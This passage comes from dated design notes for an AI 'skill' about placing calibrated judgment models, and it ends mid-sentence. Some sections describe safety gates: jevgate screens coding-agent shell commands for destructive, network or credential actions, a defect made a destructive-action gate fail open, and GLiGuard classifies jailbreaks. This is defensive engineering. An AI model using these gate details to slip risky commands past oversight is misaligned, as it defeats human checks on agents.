checker*. LLM spec + System One "does this spec look good?" = double
theater.

**Crossover (placement intuition, not SWE-only, not a mapping until a
precondition survives).** NATM observational method: instrument often,
adapt support in code. Snap-fit: designed give only where a miss is
reversible. Norman gulfs: judgment evaluates candidates; forcing
functions execute safely
([NN/g](https://www.nngroup.com/articles/two-ux-gulfs-evaluation-execution/)).
Leveson STAMP: safety is a control problem; a 99% Noul is a sensor, not
a constraint
([STAMP intro PDF](https://psas.scripts.mit.edu/home/wp-content/uploads/2016/04/STAMP-Intro-2016.pdf)).

**Skill impact.** New card; SKILL.md protocol/index/non-negotiable/FAQ
("replace TLA+?" / "Noul ≈ proof?"); methods-catalog rejected row;
composition-algebra position 9; toolbox family row. Identity lock
holds. No invented APIs. When `FORMAL-METHODS-SYSTEM-ONE.md` lands,
fold named rows — do not wait on it.

## 21. Cross-domain mental models (2026-09-18, critical scope)

Augustus is **not SWE-only**. Design judgment for placing typed
probabilistic judgment using math/logic/algorithmic frames across AI,
SWE, business, knowledge work, and life. Formal methods remain one
pillar. Skill card: `references/mental-models.md`.

**Pillars (method, not vendor):** expected utility + Chow-style
abstention; calibration and Elkan cost-sensitive `t = C_FP/(C_FP+C_FN)`
([Elkan PDF](https://cseweb.ucsd.edu/~elkan/rescale.pdf), [sklearn
walkthrough](https://scikit-learn.org/stable/auto_examples/model_selection/plot_cost_sensitive_learning.html));
[VOI](https://en.wikipedia.org/wiki/Value_of_information) (gather as an
act); [MCDA](https://en.wikipedia.org/wiki/Multiple-criteria_decision_analysis)
(weights in policy); search/control substitutions; [signal
detection](https://en.wikipedia.org/wiki/Detection_theory) (criterion ≠
accuracy); Leveson sensor≠constraint; NATM/snap-fit/Norman as portable
intuition.

**Non-negotiable restated for any domain:** exact work in code *or
policy* (checklist, ledger, law, recipe); model owns narrow judgment;
never launder a Noul as proof.

**Status discipline:** SWE rows that already have launch-week artifacts
stay Empirical; inbox/hiring/apartment/bid-no-bid/cooking are
**Hypothesis** until labeled logs exist. Promote only with acceptance
tests.

**Skill impact.** SKILL.md opening/description/protocol/design-card
domain+pillar fields; FAQ "only for software?"; mappings.md beyond-SWE
paragraphs; boundary-audit practice-not-just-code + TOCTOU/vacuous-spec
red flags; marketplace/README exposure. Identity lock holds. No APIs
invented.

## 22. Formal-methods expansion + Hypothesis mapping cards (2026-09-18)

Queued follow-up after the mental-models hub: expand the FM pillar
without waiting on `FORMAL-METHODS-SYSTEM-ONE.md` (still 0 GitHub
hits), and add Hypothesis cards so exposure is not SWE-only.

**Alloy Analyzer vs Apalache.** Alloy is a model *finder* (SAT, finite
scope, relational; [FAQ](https://alloytools.org/faq/how_does_the_alloy_analyzer_differ_from_model_checkers.html)).
Apalache is a symbolic model *checker* for TLA+ (SMT; modes: some
traces ≤k, all traces ≤k, inductiveness if the invariant holds —
[apalache-mc.org](https://apalache-mc.org/)). TLC enumerates TLA+
explicitly. Same harm: bounded green ≠ proof. Judgment triages
counterexamples; a Noul does not sit in either seat.

**DST trio.** Antithesis = deterministic hypervisor around existing
software. Resonate = Lean 4 spec + differential oracle + DST of the TS
SDK (CI replays seeds twice). PufferLib = the env is already a
simulator; Serial + seeds for contract debugging; Ocean sanity envs are
trainer contracts, **not** comparative RL baselines
([arXiv 2406.12905](https://arxiv.org/abs/2406.12905);
[puffer.ai/docs](https://puffer.ai/docs.html)). A seed does not make
GPU training bitwise deterministic. Judgment clusters failing
episodes; it does not vote that the policy is correct.

**TOCTOU-of-Noul / AI×FM.** Judge at t0, act at t1 — the check was never
atomic. Same shape in agents, credit-then-wire, kitchen, hiring, and
"spec looks good" then merge. Hillel vibing specs (10 Mar 2026) plus
receipt theater (MCP ran a tautology) and mode laundering (Quint `run`
as `verify`; Apalache random-exec as BMC). QCon 2026 informal-methods
talk: spec / environment / properties are three views.

**Hypothesis cards** (`mappings.md` §6–§9): VOI/gather; SDT/ROC
criterion; Leveson sensor≠constraint; search/control loops outside SWE.
Promote only with an acceptance test that ran. Non-SWE gallery stays
Hypothesis.

**Non-negotiable unchanged:** code/policy owns exact work; model owns
narrow judgment; never launder a soft Noul as proof. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first`. No invented APIs.

## 23. Curriculum fold (2026-09-18)

Attached research docs landed under
`research/archive/curriculum/` (`FORMAL-METHODS-SYSTEM-ONE.md`,
1-pager, source list, `MENTAL-MODELS-ACROSS-DOMAINS.md`, seed table).
Named rows folded into the skill; the archive is provenance, not a
second doctrine.

**FM.** One-screen alias `references/formal-semi-formal.md`. Depth stays
on `formal-methods.md`: Amazon TLA+ PDF; mCRL2 / KeYmaera X; Alloy
composition-algebra table; semi-formal artifacts (UML/SysML/ArchiMate/
GWT/BPMN/ADRs); Lean/ITP/PBT + DafnyPro "propose, verifier decides";
Resonate HQ = Distributed Async Await (not "Resonate AI"); Cauli ∩
Hillel; Kent / Shirky / Vanderburg / Agans; help/harm checklist.

**Mental models.** Master rule; satisficing; conformal; A* inadmissible;
hysteresis/deadbands; alert fatigue; mechanism design; OR; epistemology;
ten harm patterns.

**Hypothesis cards** `mappings.md` §10–§16: spec pipeline, Alloy loop,
RV sandwich, DST triage, durable agent control, assignment hybrid,
situated density. Still do not promote without an acceptance test.

HTTP 200 this pass: Amazon FM PDF, Cauli, Shirky, Hillel dreidel,
Resonate why+tested, mCRL2, KeYmaera X, arXiv 2502.15441, Lamport Agent.

## 24. jevals — labeled-case workbench (2026-09-18)

[dayhaysoos/jevals](https://github.com/dayhaysoos/jevals) is a local MIT
workbench for running Jev questions against labeled cases (Noul / Choice /
Score, and combinations), comparing saved runs, with WebMCP plus an agent
skill. Not affiliated with TypeSafe. README fetched this pass (HTTP 200).

**Role for Augustus:** empirical acceptance-test *surface* for Hypothesis
mapping cards (`mappings.md` §6–§16). Complements
`scripts/evaluate_decisions.py` (offline Brier / reliability / cost on
exported JSONL). The workbench's existence is Empirical (public repo +
README); promoting a Hypothesis card still requires *your* labeled cases
plus a card-level test that ran. Augustus is not a jevals how-to — do not
copy CLI, env, or ports into skill cards. One-sentence cite:
`references/validation.md` (offline-eval section).

## 25. Hourly 10:07 Boise fold (2026-09-18T16:07Z)

Standing fold of the 10:07 America/Boise hour (16:07 UTC) into PR #1.
Discourse from named X posts (fetched live); GitHub READMEs HTTP 200.
Skill impact is **species map + Hypothesis cards**, not how-tos. Domain-
general mission unchanged. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No invented APIs.

### GLiNER as a Jev-class *peer* (not a GLiClass footnote)

[GLiNER](https://arxiv.org/abs/2311.08526) (Zaratiana et al., NAACL 2024)
is a bidirectional encoder that **locates spans** matching open type
labels in one forward pass. [GLiClass](https://arxiv.org/abs/2508.07662)
is the sequence-classification sibling (Knowledgator): **categorize the
text**, not the spans. [GLiNER2.5](https://github.com/fastino-ai/gliner2)
(fastino-ai; HF `fastino/gliner2.5-{small,base,multi}-v1`) is a later
**local multi-head**: entities, classification, records, relations in one
schema; CPU-first (74M / 194M / 287M). Discourse this hour
([@singularity_sah](https://x.com/singularity_sah/status/2100980051550306418)
replying to the prior
[36×-cheaper Browser Use claim](https://x.com/singularity_sah/status/2100667967499386976)):
GLiNER can do the same *agentic decision* jobs as Jev, local / free /
laptop. **36× is a tweet, not a re-run** — Hypothesis as a number;
Empirical as family existence (paper + public checkpoints).

Species map (skill card `judgment-class.md`):

```text
locate      GLiNER / span extractors     what's *in* the text
categorize  GLiClass / sequence labels   what *is* the text
decide      Jev / Laya / openjev         Choice / Score / Noul over a state
rank        listwise                     order a retrieved shortlist
perceive    CLIP/SigLIP / region Choice  score candidates you extracted
```

A span-locator is not a drop-in Noul. Using GLiNER2.5 classification
heads as a local decision API still needs *your* ECE and fail policy.
Do not copy `AutoExtractor` into skill cards.

### openjev-lm — CPU distill of a hosted teacher

[DECRUX9812/openjev-lm](https://github.com/DECRUX9812/openjev-lm) (MIT):
Qwen2.5-0.5B-Instruct + LoRA (2.16M trainable), 2,591 rows of **Jev's
own API answers**, 400 steps, **6 vCPU, no GPU, 89 minutes**. Gold:
**65/70 = 92.9%** bucket accuracy on 70 hand-labelled Regina job
postings (two independent harnesses agree). Hosted Jev 68/70 = 97.1%;
classifier arm (frozen bge-small) 66/70 = 94.3% and 99.39% agreement on
a 2,631-posting stream. Fresh 106 postings: LM 104/106 = 98.1% *teacher
agreement* (ECE 0.004, Brier 0.031) — that is agreement with Jev, not
independent gold. Honest limits in the README: 2 `service_lead` rows;
one seed, one domain, one annotator; labels from a hosted API;
unaffiliated with TypeSafe. **Empirical** as a named receipted run;
**Hypothesis** as "overnight-CPU-distill any Jev workflow."

### Input brittleness → calibration / sensitivity / abstention

[@brandonjcarl](https://x.com/brandonjcarl/status/2100976725660192989):
semantically equivalent question wording ("Is this the same person as
X?" vs "Same person as X?") can swing probabilities a lot. Not a
blocker; a design constraint. Independently,
[jevgate](https://github.com/thevibeworks/jevgate) README: a comment
moved `git checkout -- .` from 0.91 to 0.37; identical requests differ
by up to 0.18; threshold leaves about one such width to the nearest
unsafe command. Fuel for `mappings.md` §17: paraphrase pairs as a
behavioral test; Chow abstain when paraphrase-disagreement is large;
do not treat a single p as invariant to wording. **Hypothesis** as a
law; **Empirical** as published cautions.

### Allowlist ∩ System One (jevgate)

[thevibeworks/jevgate](https://github.com/thevibeworks/jevgate): three
tiers — **Proven** (every verb is a listed read-only tool, 4 µs, nothing
sent) → **Refused** (code can prove a write/network/wrapper/credential
shape; model never asked) → **Unknown** (unlisted verb only, five Nouls,
admit iff every p < 0.2). It can say allow or say nothing; it **cannot
block**. Jev alone leaks (`/bin/ls` at 0.04) — that is why it is the
third tier. 249 labelled commands, worst-of-three: held-out unsafe
unasked **0/59** (allowlist alone also 0; jevgate lifts safe-unasked
15/35 → 30/35). Real traffic 116,979 Bash calls: 26.4% proven; 16.2%
reach Jev. Credits pi-warden for code-then-model. Mapping `mappings.md`
§18. Domain-general: recipes / law / text-layer first; judge leftovers.

### Langfuse LLM-as-judge framing

[@langfuse](https://x.com/langfuse/status/2100980004678971491): Jev
cannot write sentences and is framed as a **direct alternative to
LLM-as-a-judge** (Choice / Score / Noul + certainty). Placement, not a
Langfuse how-to: when the eval output is a typed decision, a judgment-
class model is the judge; when you need a paragraph rationale or a
trace UI, generation / Langfuse still own those seats. Verbal LLM
scores remain uncalibrated (`judgment-class.md` VLM-as-judge). FAQ
row. **Hypothesis** as "replace every LLM judge"; **Contract** as
"cannot write."

### OCR router measured econ

[@MisbahSy](https://x.com/MisbahSy/status/2100979973905592387) /
[misbahsy/doc-router](https://github.com/misbahsy/doc-router): page-by-
page "needs OCR?" — structural pdf-inspector first, Jev on the remainder,
merge. 19 docs / 155 pages, `mistral-ocr-latest` via LiteLLM, 3 runs:
155 → 87 pages billed; 35.6s → 20.7s (**1.72×**); $0.3100 → $0.1783
(**1.74×**). 9 pages that needed OCR and didn't get it vs **28** for a
rules-only judge. Same composition as jevgate (hard prove ∩ soft
remainder). VOI: do not buy an observation the text layer already has.
**Empirical** as this corpus; re-measure on yours. Not an OCR-vendor
tutorial.

### Pointers (next to jevals; not how-tos)

- [kevinpita/pi-jev-context](https://github.com/kevinpita/pi-jev-context)
  — reversible context sieve for Pi: hide, do not delete; always-keep
  user/system/todos; default τ=0.8 (aggressive); `/jev off` restores.
  Applied-mappings §1 cousin of winnow/jevprune. Independent, not
  official Pi/TypeSafe.
- [jeiel85/jevscope](https://github.com/jeiel85/jevscope) — local-first
  visual decision debugger + JSONL regression (Choice/Score/Noul,
  compare two definitions, expectations). Sits **next to**
  `dayhaysoos/jevals` (already §24) as an acceptance-test surface.
  Policy buckets are JevScope-derived, not Jev answers. Do not copy
  ports/env into skill cards.

HTTP 200 this pass: all seven GitHub URLs, GLiNER arXiv 2311.08526,
GLiClass 2508.07662, HF `fastino/gliner2.5-base-v1`, four named X posts.

## 26. Same window — trolley, dual orchestration, JevLint (2026-09-18)

Standing-order extras from the same Boise morning. HTTP 200 on named
posts/READMEs. doc-router already in §25 (add: judge is **2.5% of the OCR
bill it authorises**; heuristic is cheaper still and misses 3× more).

### Listwise I/O ≠ decision rationality (Han Xiao trolley)

[@hxiao](https://x.com/hxiao/status/2100973209114075330): a Jev-style
API on **jina-reranker-v3.5** as a "System 1" decision engine. It
**always pulls the lever** in the trolley problem, whether one person
dies or one billion. The model was trained to maximize retrieval
relevance, not decision rationality. I/O works: a listwise reranker can
be *dropped in* as a "decision maker." That is the rejected design made
visible. **Empirical recipe** for Augustus: never treat a listwise
retrieval scorer as an ethics/value Choice without a separate policy.
No public repo found this pass; cite the tweet. Skill: `judgment-class.md`
listwise fork; FAQ; mappings §4 / non-negotiable.

### Dual orchestration (James Ward)

[@JamesWard](https://x.com/JamesWard/status/2100976393546772628): two
topologies, same ownership split:

```text
A. LLM outer loop; Jev is a *tool* that selects/plans MCP calls
B. Jev outer loop; LLM is a *tool* that writes
MCP output schemas are the state Jev can plan over
```

He then has Jev build a workflow AST. **Hypothesis** as a product
("Jev is the planner"); **Empirical** as named topologies. MCP schemas
are exact structure; Jev judges among tools those schemas describe;
code still dispatches. Do not thin into an MCP how-to. Card:
`mixed-architecture.md`.

### JevLint — convention lint as write→check→fix

[huntedman/JevLint](https://github.com/huntedman/JevLint) (MIT,
independent, not TypeSafe): plain-English conventions → file-level Noul
≥ 0.8 findings. Built-ins: `magic-strings`, `descriptive-names`. Custom
plugin = a yes/no question. **No** line-level diagnostics, generated
names, or auto-fixes — the agent/CI owns when to run and how to fix.
  Sibling of `doeixd/jev-pref` (YOU define the rule / Jev classifies /
  code maps outcome). Pointer only; do not copy CLI/env into skill cards.

## 27. Adversarial review of the whole skill (2026-09-18) — review findings, not doctrine

Hostile read of `SKILL.md` + all 16 reference cards + README / CHANGELOG /
marketplace / `docs/ecosystem.md`, against the skill's own non-negotiables.
**This section is a defect list, not a card.** Nothing here is a new
mapping, a new pillar, or a new status label. Where a finding names a
concrete defect, the fix landed in the skill and is noted inline; where
the skill was already right, it is recorded as cleared so the next pass
does not re-litigate it.

Scope note: the read started from the tree at §26 (commit `55b1379`).
Folds §28, §30, §31, and §32 landed *while* this review was running; they
are re-checked in the addendum at the end of this section. §29 is an
unused number left by that concurrent fold — not a missing note.

### Defects found and fixed

**S1 (high) — "every error path fails open" stated as a universal gate
rule, in the one position where side effects live.**
`composition-algebra.md` position 3 (Gate) carried the governing rule
"every error path fails open", and its own example column is a
*pre-action destructive gate* (destructive .90 / exfil .70).
`agent-self-assessment.md` stated the same rule as a non-negotiable
boundary. Read literally, a timeout on a destructive-action gate admits
the destructive act. Every other card says the opposite: fail policy is
**per action**, and dispatch / side-effect gates fail **closed**
(`SKILL.md` protocol 6, `mixed-architecture.md` prefilter table,
`judgment-class.md` composition rule, `applied-mappings.md` §4–§5,
`methods-catalog.md` cascade row). `mappings.md` §18 already words the
precondition correctly ("fail open unless a real sandbox/interlock sits
underneath"). Fixed: both places now carry that precondition — advisory
guards fail open *because* a hard interlock/sandbox is underneath;
selection and authorization gates fail closed.

**S2 (high) — dual-orchestration topology A said the decision model
"plans" MCP calls.** `mixed-architecture.md` transcribed the James Ward
topology (§26) as "Jev is a *tool* that selects / plans MCP calls" while
the same file, 40 lines earlier, calls "the model chooses its next tool
in a loop" a standing red flag — as do `mappings.md` §9,
`mental-models.md`, and `boundary-audit.md`. The section's "Does not"
line only forbade the narrower "planner that invents tools". Fixed:
topology A selects from a closed catalog and code dispatches; the
planner rejection is restated in place. "Jev builds the AST" stays
Hypothesis.

**S3 (medium-high) — the trolley result was labeled "Empirical
recipe".** `judgment-class.md`'s own legend reserves that label for a
named paper or repo; §26 records no public repo, only a tweet. Worse,
the label invites reuse of what is a **rejection**. Fixed: relabeled an
Empirical *rejection* (one tweet, no repo), content unchanged.
`faq.md` and `methods-catalog.md` already had it right.

**S4 (medium) — the skill's own advice violated its species map.**
Three places (`SKILL.md` protocol 4, `judgment-class.md` portent 2,
`applied-mappings.md` §5) offered "GLiClass tags **or GLiNER spans**" as
the one-pass alternative when a label set or tool catalog outgrows Jev's
255 options. Routing over a closed catalog is *categorize* / *decide*;
nothing is located, and `judgment-class.md` itself says a GLiNER span is
not a drop-in Noul. Fixed: GLiClass (categorize) is the substitute for
large/changing label sets; GLiNER (locate) applies only where the answer
*is* a span in the text.

**S5 (medium) — the openjev-lm caveat was attached to the wrong
number.** `judgment-class.md` and `faq.md` both read "92.9% on 70 gold …
is not independent gold". Per §25 the 92.9% *is* measured against 70
hand-labelled postings; the figure that is teacher-agreement rather than
gold is the 98.1% on 106 fresh postings. The real limits are: training
labels came from the hosted teacher, n=70, one annotator, one domain,
one seed. A caution that misreads its own source is worse than none —
a reader who checks stops trusting the label. Fixed in both cards.

**S6 (medium) — one live API constructor leaked into a skill card.**
`optimizer-integration.md` carried
`typesafe({apiKey}).systemOne({state, questions})` — request shape plus a
credential argument. `mixed-architecture.md`'s neighbor table says
Augustus is not for "curl snippets, field names, SDK versions" and
`boundary-audit.md` red-flags "SDK fields written from memory instead of
live docs". Fixed: the call form is gone, the placement rule stays, and
the card points at the framework's own docs and `typesafe-ai`.

**S7 (medium) — `question-design.md` enumerated request-body field
names.** The accepted `instructions` object keys are contract surface
owned by `typesafe-ai` + live docs, and were listed from a dated
snapshot with no re-read hedge (the envelope numbers likewise). The
card's mechanics — one property per question, crisp conditions, the
symptom→cause→fix table — are legitimately Augustus and stay. Fixed:
the key enumeration is replaced by a pointer, and the dated
contract surface is marked as a pin to re-read live.

**S8 (medium) — `mappings.md`'s preamble overclaimed uniformity, and the
range reference went stale.** The preamble read "Cards §6–§18 [now §19]
are **Hypothesis** until an acceptance test runs", which the cards' own
bodies contradict: §8's ownership split is Contract, §9's example is
Empirical (jev-mcts), §18's named shapes are Empirical. `SKILL.md`'s
index was *more* precise than the file it points at. A blanket claim the
body contradicts teaches the reader to skim the labels. Separately, when
§19 was added mid-review, four files kept pointing at §6–§18
(`faq.md`, `formal-methods.md`, `formal-semi-formal.md`, `README.md`)
while `SKILL.md`, `mappings.md`, and `docs/ecosystem.md` moved to §6–§19.
Fixed both: Hypothesis **as domain-general products** with the exceptions
named, and all seven range references aligned.

**S9 (low-medium) — §17 quoted jevgate's ≤0.18 jitter without forbidding
its reuse as a constant.** §18 explicitly forbids copying 0.2 and 1.74×;
`composition-algebra.md` open positions already say a universal jitter
bound is Hypothesis. Fixed: one clause in §17's "does not transfer".

**S10 (low-medium) — four cards had no trigger term in the SKILL.md
description.** `boundary-audit.md` (which protocol step 1 *requires* for
any existing system, PR, or workflow), `question-design.md` (the
diagnosis table — "my Noul sits at 0.5" matched nothing),
`agent-self-assessment.md`, and `optimizer-integration.md`.
`validation.md`'s own frontmatter rule says to name the jobs and warns
that trigger-term gaps are the top routing failure. Fixed: one compact
clause naming those four jobs.

**S11 (low) — evidence label disagreement on the ownership split.**
`toolbox-mapping.md` labeled proof-vs-judgment ownership **Empirical**;
`mappings.md` §8, `methods-catalog.md`, and `formal-methods.md` call it
Contract. Fixed to Contract.

**S12 (low) — the done-check spent a Noul on a countable fact.**
`agent-self-assessment.md` gate 3 asked one Noul for "'done' claimed
after code changes with no test/build/lint result". Whether a
test/build/lint result exists in the trace is structural; only the
*claim* is semantic. Spending the model on the countable half is the
"Jev on `/bin/ls` as the first tier" pattern §18 rejects. Fixed: the
check is split — structure first, Noul on the remainder.

### Cleared (checked, no change needed)

- `GLiClass-adjacent` no longer appears in any skill card; it survives
  only in notes §19 above, as provenance.
- Resonate HQ is correctly identified as durable async execution (not the
  unrelated "Resonate AI" brand) in all five places it appears, and
  promise settlement is never delegated to a Noul.
- Alloy model-finder vs Apalache modes vs TLC explicit-state are never
  collapsed; the Apalache mode list is intact in both FM cards.
- The 36× Browser Use figure is labeled a tweet everywhere it appears.
- jevgate 0/59, doc-router 1.74×, and openjev-lm's numbers are never
  offered as universal constants; §18 and `applied-mappings.md` §6
  forbid copying them.
- No `npx`, `AutoExtractor`, `TYPESAFE_API_KEY`, port, or install-command
  leaks in any skill card (S6 was the only API-shape hit).
- Domain-general mission holds: `mental-models.md` carries all five
  domains with SWE rows marked Empirical and the rest Hypothesis;
  SWE-scoped cards say so in their titles and in `SKILL.md`'s index.
- Non-negotiables are stated in `SKILL.md` and repeated, not weakened, in
  `mental-models.md`, `formal-methods.md`, `formal-semi-formal.md`, and
  `methods-catalog.md`'s standing-rejections list.
- CHANGELOG's "§6–§16" is historically accurate for the order 0.3.0 was
  assembled in (§17–§18 arrived in the hourly fold, on the next line) —
  not a stale cross-reference.

### Standing risks (not defects; watch, do not fix by adding text)

- `optimizer-integration.md` and `agent-self-assessment.md` remain the
  most vendor-shaped cards in the skill. They earn their place as
  placement cards; they are the first place to look if Augustus starts
  drifting back into a how-to.
- Card count is 16 and several cards now cross-reference four or more
  others. The duplication guard ("do not duplicate doctrine") is holding
  but is the thing most likely to break next.

### Addendum — re-check of the folds that landed mid-review (§28, §30–§32)

Those four folds (effect-oriented loops, GLiGuard, Archer Hume,
TypeAR) were written into the same tree while this review ran, so they
got the same hostile read. **No new defects.** Specifically checked:

- **Species map held under pressure.** GLiGuard is placed on the
  *categorize* row and explicitly not as a sixth species or a Jev weight
  clone; TypeAR is placed as a **surface** on a generator, not as
  `decide`. Both are the discriminations §25's species map exists to
  force, and both landed on the right side.
- **Evidence labels held.** The Hume essay is labeled a *reconstruction*,
  not a TypeSafe contract, with his own published / observed / inferred
  split preserved; the announced open-weight drop is **Watch, not
  shipped**; TypeAR's ~5.8× is marked "their example, not a portable
  benchmark"; GLiNER2's "like jev" is read as naming the *job*, not the
  objective. None of these is copied as a constant.
- **Non-negotiables held.** `mappings.md` §19 keeps transitions and the
  side effect in the host, fails closed on an unknown option id, and
  refuses to multiply edge predicates. The new IIA / option-order
  material is added as a *property test* in `validation.md` with the
  explicit rider that a clean PBT run is not a proof — sensor, not
  constraint.
- **Identity lock held.** §19 refuses the Effect.ts misreading and says
  the ZIO client's combinator is neither the Jev HTTP contract nor an
  Augustus API; the GLiGuard and TypeAR cards say "do not invent a call
  shape." No CLI, env, port, or `AutoExtractor` leak arrived with them.
- **Cross-references resolve.** Every `notes.md §N` pointer in the skill
  and in `docs/ecosystem.md` was validated against the section titles
  actually present; none dangles. The Hypothesis range was left stale at
  §6–§18 in `faq.md`, `formal-methods.md`, `formal-semi-formal.md`, and
  `README.md` after §19 was added — repaired here (see S8), which is the
  recurring failure mode of range references and an argument for citing
  card names rather than ranges next time.

Process note, not a skill finding: two agents wrote this working tree
concurrently during this pass. That is how the §29 gap and a transient
duplicate `mappings.md` §19 appeared (the duplicate resolved itself
before commit and was never a defect in the skill). Worth avoiding, not
worth documenting in a card.

## 28. Effect-oriented loops + GLiNER2 "like jev" (2026-09-18)

Two posts, both image-primary. `note_tweet` was requested and absent.
HTTP 200: both X URLs, GLiGuard arXiv 2605.07982, `fastino-ai/GLiGuard`,
`jamesward/zio-typesafe-ai` (README loop section matches the image).

### Effect-oriented state-machine loops (James Ward)

[@JamesWard](https://x.com/JamesWard/status/2100981305009664299)
(2026-09-18T16:12Z): "Effect Oriented Jev-driven state-machine loops!"
The image is titled "Jev-driven state-machine loops." Load-bearing
sentence, same wording as the
[client README](https://github.com/jamesward/zio-typesafe-ai):

> An action handler may run arbitrary ZIO effects—MCP calls, database
> operations, or a no-tool generative model call—while Jev remains the
> outer decision loop.

Architecture note in that repo, not a second claim: "Jev never generates
an action; on every iteration the host generates the *entire* finite set
of legal actions and Jev answers one `Question.Choice`."

**Not Effect.ts.** "Effect Oriented" is Ward's name for effect systems
(*Effect Oriented Programming*, Scala 3 / ZIO). The diagram is
`TypeSafeAI.loop` in that ZIO client. Do not transcribe it as an
Effect.ts snippet, and do not treat the client's combinator as the Jev
HTTP contract or as an Augustus API. Identity lock holds: `typesafe-ai`
owns integration contracts; this skill owns placement.

**What transfers (Hypothesis, `mappings.md` §19):** §3 decision circuits
with the effect made explicit. Soft Choice on the transition; code owns
continue/done and the side effect. Extends §26 dual orchestration
topology B (Jev outer loop; generator is a callee; MCP schemas are
state). Unknown option id fails closed before the effect. **Does not:**
Jev inventing tools; handler latency counted as model cost; 1–255 as a
class law.

### GLiNER2 multi-task classification (urchade, primary source)

[@urchadeDS](https://x.com/urchadeDS/status/2100929613857804379)
(2026-09-18T12:47Z), GLiNER author: "how does GLiNER2 performs multi-task
classification (like jev)" — from their GLiGuard paper
([arXiv:2605.07982](https://arxiv.org/abs/2605.07982)). The image is
Figure 3. Load-bearing caption:

> It jointly encodes a linearized task-label schema with the input text,
> then scores each label via a shared MLP classifier to perform
> multi-task safety classification in a single pass.

Figure mechanics (not an API): linearized `[P]` task / `[L]` label
schema, bidirectional encoder, shared MLP, **softmax** for single-label
tasks and **sigmoid** for multi-label, all tasks in one pass. Paper:
0.3B encoder adapted from GLiNER2; task and label blocks composed in
the input schema. Code/models: `fastino-ai/GLiGuard`. Do not invent a
GLiNER call shape.

**Confirms the species map; does not move it.** "Like jev" names the
*job* — multi-task classification in one forward pass — not a
calibrated Choice / Score / Noul. That is **categorize** beside
**decide**. Locate stays GLiNER spans. GLiNER2.5 local multi-head (§25)
is a different checkpoint; do not collapse GLiGuard into it. 36×
Browser Use stays a tweet/Hypothesis, not a re-run. Species map:
categorize row, not a new species (`judgment-class.md`). Author-reported
scale, the README aggregation rule, and the FAQ row: §30.

## 30. GLiGuard — README and paper claims (2026-09-18)

Extends §28 (tweet / Figure 3). Does not replace the Ward card there
or in `mappings.md` §19. HTTP 200 this pass: GitHub README (HTML and
raw), [arXiv:2605.07982](https://arxiv.org/abs/2605.07982), Hugging Face
`fastino/gliguard-LLMGuardrails-300M`.

**Author-reported, not re-run.** Fastino; Urchade Zaratiana, Mary
Newhauser, George Hurn-Maloney, Ash Lewis. Schema-conditioned encoder
guardrail on the GLiNER2 interface. One non-autoregressive bidirectional
pass. Named tasks: prompt safety, response safety, toxicity / harm,
jailbreak, refusal. Paper: 14 fine-grained harm categories and 11
jailbreak strategies, composed as task and label blocks in the input
schema. README checkpoint: `fastino/gliguard-LLMGuardrails-300M` (0.3B).

Scale, do not collapse the two wordings: README says 23× to 90× smaller
than comparable 7B–27B decoder guards, and up to 16.2× throughput and
16.6× lower latency. Paper abstract says up to 16× throughput and 17×
lower latency; paper body (Table 3) matches the README (16.2× / 16.6×).
README benchmark averages: 87.7 prompt F1, 82.7 response F1.

Training: adapted from GLiNER2; WildGuardTrain for safety and refusal;
auxiliary harm and jailbreak labels are automatic and, in the paper,
weakly supervised (GPT-4.1 on unsafe samples). **Not a Jev weight
clone.**

**Aggregation** is the README's benchmark script, not new doctrine. A
prompt is unsafe if safety says unsafe **or** toxicity / jailbreak is
any non-benign label. A response is unsafe only if safety says unsafe
**and** refusal does not fire — refusal overrides. Paper §3.6 is the
same monotonic override. Point at existing policy-in-code (`mappings.md`
§3; judge-once / re-policy; explicit policy in `mixed-architecture.md`).
Not generalized past that script, so not a Hypothesis. Their script's
default operating point is 0.5; do not copy it.

**Placement.** Same interface shape as batched System One questions;
different objective (safety schema vs Choice / Score / Noul).
**Empirical** open encoder class next to Laya and GLiClass. "like jev"
stays discourse (§28). A GLiGuard score is not a proof. LLM I/O safety
is not coding-agent tool gates. rh-guard README (HTTP 200) is the
reward-hack / eval-integrity hook; jevgate is the allowlist shape.
Different holes. Do not copy either install.

## 31. Archer Hume — architecture reconstruction (2026-09-17)

[Jev's Architecture Unmasked](https://archerhume.com/posts/jevs-architecture-unmasked/)
(17 Sep 2026, ~28 min; HTTP 200 this pass). Probe of `jev-1.13.0`, one
early-access account, one region. Headline is ~10,000 API calls; the
methods section itemizes probe, benchmark, and follow-up requests (shared
benchmark items — not 10k independent problems). **Reconstruction, not a
TypeSafe contract.** Live shapes and the ~32k/~64k envelope stay in §1
and the docs. Labels are his: published by TypeSafe, observed in probes,
inferred from them.

1. **End with a readout, not AR text.** Published: probabilities in
   parallel, not token-by-token generation. Observed: `output_tokens` is
   a billing figure from the serialized response, not a decode trace (the
   question id is not sent to the model, yet the count moves with it;
   `0.0` costs the same as `0.01`; latency tracks input length). Inferred:
   the head (slot softmax, reserved vocab rows, or a pointer). Reserved
   label tokens remain possible.
2. **Share state, isolate questions.** Observed: a secret in a sibling
   question is invisible (0.00); the same text in state is visible
   (~0.90–0.92). Accounting is additive; up to ~100 questions, server time
   barely moves. Inferred, not measured: prefix KV plus causal suffixes.
   Hydragen/DeFT are prior art he cites, not a library claim. The mask
   itself is not exposed.
3. **Causal backbone — inferred.** Probes cannot separate a causal decoder
   from a bidirectional encoder. He assumes a pretrained causal decoder
   (MMLU-Pro 84.6%; RLCD described as post-training) and says bidirectional
   cannot be ruled out. Tokenizer is observed: none of 192 public
   tokenizers matched; closest public agreement is Qwen (348/415), not an
   exact match; o200k is close and ruled out by digit splitting. Closest
   tokenizer is not an identified base model.
4. **Options interact before the choice — behavior observed.** Appending
   an irrelevant option moved log-odds of two existing options in all ten
   blocks (~+0.38 → ~+0.11; mean change −0.28). That breaks IIA for fixed
   independent logits plus a fixed softmax. Mechanism is not unique (a
   set-dependent temperature can do it). Order sensitivity, separate
   probe: reversing options moved a probability from roughly 0.84–0.89 to
   0.93–0.96, so a threshold near 0.9 can change the act.
5. **Train the distribution; confidence is arithmetic.** Published name:
   RLCD. Which loss is unpublished — log or Brier is his proposed proper
   scoring recipe, not a disclosed objective. Observed in the adapter he
   cites (`confidence_metrics.py`, rev `fb52b103`): for K>1, Choice
   confidence is `(p_max − 1/K) / (1 − 1/K)` — distance from uniform, not
   a second learned correctness score. A peaked distribution can still be
   wrong. MMLU ECE 0.0313 and the fresh-math collapse are already §7.
   Properness is not a deployment guarantee.
6. **Sparse MoE — inferred, not observed.** He expects sparse experts and
   says a dense swap would leave the interface, shared state, isolation,
